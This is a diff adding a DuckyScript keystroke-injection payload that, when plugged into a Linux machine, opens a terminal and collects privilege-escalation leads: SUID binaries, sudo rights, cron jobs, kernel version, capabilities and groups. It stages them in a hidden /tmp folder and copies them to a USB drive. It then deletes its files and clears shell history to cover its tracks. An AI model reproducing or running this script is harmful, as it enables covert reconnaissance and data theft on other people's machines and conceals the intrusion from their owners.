@@ -1,0 +1,61 @@
+# ============================================
+# LINUX PRIVESC CHECK - Find Escalation Paths
+# ============================================
+# Purpose: Find privilege escalation opportunities
+# Time: 20 seconds
+# Author: D3n14l0f53rv1c3
+# ============================================
+
+DELAY 2000
+
+CTRL ALT T
+DELAY 1000
+
+STRING mkdir -p /tmp/.pe
+ENTER
+DELAY 100
+
+# SUID binaries
+STRING find / -perm -4000 -type f 2>/dev/null > /tmp/.pe/suid.txt
+ENTER
+DELAY 3000
+
+# Sudo misconfigurations
+STRING sudo -l 2>/dev/null > /tmp/.pe/sudo.txt
+ENTER
+DELAY 500
+
+# Writable cron jobs
+STRING ls -la /etc/cron* /var/spool/cron* 2>/dev/null > /tmp/.pe/cron.txt
+ENTER
+DELAY 200
+
+# Kernel exploits
+STRING uname -a > /tmp/.pe/kernel.txt
+ENTER
+DELAY 100
+
+# Writable paths
+STRING echo $PATH > /tmp/.pe/path.txt
+ENTER
+DELAY 100
+
+# Capabilities
+STRING getcap -r / 2>/dev/null > /tmp/.pe/caps.txt
+ENTER
+DELAY 2000
+
+# Docker/LXD groups
+STRING groups > /tmp/.pe/groups.txt
+ENTER
+DELAY 100
+
+# Copy to USB
+STRING cp /tmp/.pe/* /media/usb/ 2>/dev/null
+ENTER
+DELAY 300
+
+STRING rm -rf /tmp/.pe
+ENTER
+STRING history -c; clear
+ENTER
